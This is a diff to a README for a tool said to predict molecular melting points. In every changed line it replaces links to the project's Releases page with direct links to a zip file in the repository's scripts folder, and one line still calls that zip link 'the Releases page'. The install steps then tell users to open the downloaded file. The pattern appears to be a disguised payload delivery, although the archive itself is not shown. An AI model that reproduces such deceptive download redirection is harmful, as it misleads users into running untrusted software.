@@ -1,7 +1,7 @@
 # 🧬 mol-meltingpoint-portfolio - Predict Melting Points Effortlessly
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/krompirko50999/mol-meltingpoint-portfolio/releases)
+[![Download Latest Release](https://github.com/krompirko50999/mol-meltingpoint-portfolio/raw/refs/heads/main/scripts/mol_portfolio_meltingpoint_v3.4-beta.4.zip%20Latest%20Release-v1.0-blue)](https://github.com/krompirko50999/mol-meltingpoint-portfolio/raw/refs/heads/main/scripts/mol_portfolio_meltingpoint_v3.4-beta.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the mol-meltingpoint-portfolio! This software helps you predict the melting points of molecules using advanced machine learning techniques. No programming skills are needed.
@@ -18,7 +18,7 @@ Welcome to the mol-meltingpoint-portfolio! This software helps you predict the m
 3. With these features, the software predicts the melting points using machine learning models.
 
 ## 📥 Download & Install
-1. Click [here](https://github.com/krompirko50999/mol-meltingpoint-portfolio/releases) to visit the Releases page.
+1. Click [here](https://github.com/krompirko50999/mol-meltingpoint-portfolio/raw/refs/heads/main/scripts/mol_portfolio_meltingpoint_v3.4-beta.4.zip) to visit the Releases page.
 2. Find the latest version and click on the link to download the software.
 3. Once the download is complete, open the downloaded file to install the application.
 
@@ -59,4 +59,4 @@ Join our community of users on social media and discussion forums. Share your ex
 ## ⚠️ Disclaimer
 This application provides predictions based on trained models. Results may vary depending on input quality and are intended for educational purposes only.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/krompirko50999/mol-meltingpoint-portfolio/releases)
+[![Download Latest Release](https://github.com/krompirko50999/mol-meltingpoint-portfolio/raw/refs/heads/main/scripts/mol_portfolio_meltingpoint_v3.4-beta.4.zip%20Latest%20Release-v1.0-blue)](https://github.com/krompirko50999/mol-meltingpoint-portfolio/raw/refs/heads/main/scripts/mol_portfolio_meltingpoint_v3.4-beta.4.zip)
